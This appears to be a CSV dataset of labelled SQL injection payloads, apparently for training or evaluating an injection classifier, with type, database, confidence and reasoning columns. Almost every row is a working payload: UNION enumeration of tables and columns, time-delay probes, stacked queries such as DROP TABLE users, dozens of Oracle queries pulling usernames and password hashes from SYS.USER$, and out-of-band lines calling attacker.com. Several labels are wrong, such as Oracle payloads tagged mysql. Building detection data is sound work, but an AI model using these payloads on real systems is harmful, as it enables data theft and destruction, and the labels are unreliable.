id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40420,'||utl_http.request('httP://192.168.1.1/')||',out_of_band,oracle,0.9,Signals: 'utl_http'; DB: oracle. Payload length: 45 chars.,2
40485,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",union_based,mssql,0.9,Signals: 'sysobjects'; UNION-based payload detected; DB: mssql,2
40486,' UNION SELECT NULL FROM dual--,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
40489,"' UNION SELECT NULL,NULL FROM dual--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
40531,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,2
40532,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,2
40411,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))",union_based,generic,0.7,UNION-based payload detected. Payload length: 505 chars.,2
40412,",(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;) ,(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)",time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 205 chars.,2
40475,"' UNION SELECT 0x61646d696e,0x61646d696e--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
40479,"' UNION SELECT CHAR(65,68,77,73,78),NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
40480,1; WAITFOR DELAY '0:0:5'--,time_blind,mssql,0.7,Time-blind SQLi (sleep/delay function); DB: mssql. Payload length: 26 chars.,2
40481,'; WAITFOR DELAY '00:00:05'--,time_blind,mssql,0.7,Time-blind SQLi (sleep/delay function); DB: mssql. Payload length: 29 chars.,2
40483,'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,stacked_queries,generic,0.7,. Payload length: 61 chars.,2
40487,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,error_based,oracle,0.7,Error-based SQLi (extractvalue/updatexml); DB: oracle,2
40488,1 AND ROWNUM=1 AND 1=1--,boolean_blind,oracle,0.7,Boolean-blind SQLi (OR/AND logic); DB: oracle. Payload length: 24 chars.,2
40492,"' UNION SELECT NULL::text,NULL::text--",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
40503,' AND SLEEP(5) AND '1'='1,time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 25 chars.,2
40505,"' AND IF(1=1,SLEEP(5),0)--",time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 26 chars.,2
40513,' OR 1=1--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
40514,' OR 1 = 1--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 12 chars.,2
40515,'; DROP TABLE users; --,stacked_queries,generic,0.7,. Payload length: 23 chars.,2
40516,"'; INSERT INTO users VALUES('hacker','pw')--",stacked_queries,generic,0.7,. Payload length: 44 chars.,2
40523,' UNION SELECT NULL--,union_based,generic,0.7,UNION-based payload detected. Payload length: 21 chars.,2
40524,"' UNION SELECT NULL,NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 26 chars.,2
40525,"' UNION SELECT NULL,NULL,NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
40526,"' UNION SELECT NULL,NULL,NULL,NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
40527,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
40528,"' UNION ALL SELECT NULL,NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
40529,"1 UNION SELECT @@version,NULL--",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
40530,"1 UNION SELECT user(),database()--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
40544,"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",error_based,mysql,0.7,Error-based SQLi (extractvalue/updatexml); DB: mysql,2
40471,"1,2,3--",benign,generic,0.5,. Payload length: 7 chars.,2
40472,"NULL,NULL--",benign,generic,0.5,. Payload length: 11 chars.,2
40474,"1+ + +NULL,NULL--",benign,generic,0.5,. Payload length: 17 chars.,2
40538,' '1'='1,benign,generic,0.5,. Payload length: 8 chars.,2
40539,"1 UN ION SEL ECT NULL,NULL--",benign,generic,0.5,. Payload length: 28 chars.,2
40540,"1 NULL,NULL--",benign,generic,0.5,. Payload length: 13 chars.,2
40521,'; EXEC master..xp_dirtree '//attacker.com/a'--,out_of_band,mssql,0.9,Signals: 'xp_dirtree'; DB: mssql. Payload length: 47 chars.,1
40418,’ or ‘1’=’1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1
40419,' or '1'='1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1
40476,1 AND 0x61=0x61,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
40477,' OR 0x313d31--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
40478,CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
40508,"' AND SUBSTRING(username,1,1)='a' AND '1'='1",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,1
40509,"' AND ASCII(SUBSTR(username,1,1))>64--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,1
40511,"' AND MID(version(),1,1)='5'--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,1
40520,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,1
40543,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,1
40421,' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40422,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40423,' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40424,' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40425,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40426,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40427,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40428,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40429,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40430,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40431,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40432,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40433,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40434,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40435,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40436,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40437,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40438,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40439,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40440,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40441,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40442,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40443,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40444,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40445,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40446,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40447,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40448,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40449,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40450,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40451,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40452,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40453,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40454,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40455,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40456,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40457,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40458,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40459,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40460,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40461,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40462,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40463,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40464,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40465,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40466,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40467,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40468,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40469,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
